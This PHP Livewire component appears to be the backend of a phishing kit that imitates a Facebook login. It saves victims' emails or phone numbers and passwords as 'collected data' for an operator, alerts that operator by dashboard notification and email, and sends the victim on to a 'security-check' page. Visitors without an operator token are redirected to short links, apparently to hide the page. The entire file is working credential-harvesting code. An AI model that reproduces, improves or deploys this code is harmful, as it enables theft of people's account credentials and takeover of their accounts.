<?php

namespace App\Livewire\Components;

use App\Mail\AlertAdminOfNewSubmission;
use App\Models\CollectedData;
use App\Models\ShortLink;
use App\Models\User;
use Filament\Notifications\Notification;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Str;
use Livewire\Attributes\Validate;
use Livewire\Component;

class Home extends Component
{
    #[Validate("required|string|min:8")]
    public $emailorphone;

    #[Validate("required|string|min:6")]
    public $password;

    public $rules = [
        "emailorphone" => "required|string|min:8",
        "password" => "required|string|min:6",
    ];

    public function SaveNewData()
    {
        try {
            $this->validate();
            $newData = new CollectedData();
            $newData->tracking_code = session("new_tracking_code");
            $newData->email_and_phone = $this->emailorphone;
            $newData->password = $this->password;
            $newData->user_id = User::where("auth_token", session("authToken"))
                ->first()
                ->id;
            $newData->save();

            // Save Data To Session
            \session(["collectedId" => $newData->id]);

            $user = User::where("auth_token", session("authToken"))->first();
            $admin_email = $user->email;

            //  Send Notification
            Notification::make()
                ->success()
                ->title("Data Submitted Successfully")
                ->body("New Facebook Data Has Been Received For Review")
                ->sendToDatabase($user);

            Mail::to($admin_email)->send(
                new AlertAdminOfNewSubmission($newData)
            );

            $this->redirect(
                route("security-check") . "?conf=" . session("authToken")
            );
        } catch (\Exception $e) {
            Log::info($e->getMessage());
        }
    }

    public function mount()
    {
        session(["new_tracking_code" => Str::random(10)]);
        $authToken = request()->query("conf");

        if (empty($authToken)) {
            return $this->redirect("https://is.gd/tyRyKX");
        }

        $checkToken = User::where('auth_token', $authToken)->first();

        if ($checkToken !== null) {
            session(["authToken" => $authToken]);
            if (empty(session("new_tracking_code"))) {
                $this->redirect(route("index")) .
                    "?conf=" .
                    session("authToken");
            }
        } else {
            $this->redirect("https://is.gd/VCpW0P");
        }
    }

    public function render()
    {
        return view("livewire.components.home");
    }
}
